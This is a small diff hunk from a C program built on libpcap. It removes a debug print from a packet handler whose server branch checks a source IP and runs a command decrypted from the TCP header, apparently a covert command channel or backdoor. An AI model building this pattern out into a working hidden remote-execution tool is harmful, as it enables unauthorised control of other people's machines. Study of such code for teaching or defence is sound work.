@@ -266,7 +266,6 @@ void packetHandler(u_char *ptr_null, const struct pcap_pkthdr* pkthdr, const u_c
 				tcp_header = (struct tcphdr*)(packet + sizeof(struct ethhdr) + ip_header->ihl*4);
 				if (server == SERVER) // if you are the server
 				{
-					printf("server??\n");
 					if(authenticated(ip_header->saddr))
 					{
 						runCommand(decryptPacket(tcp_header));
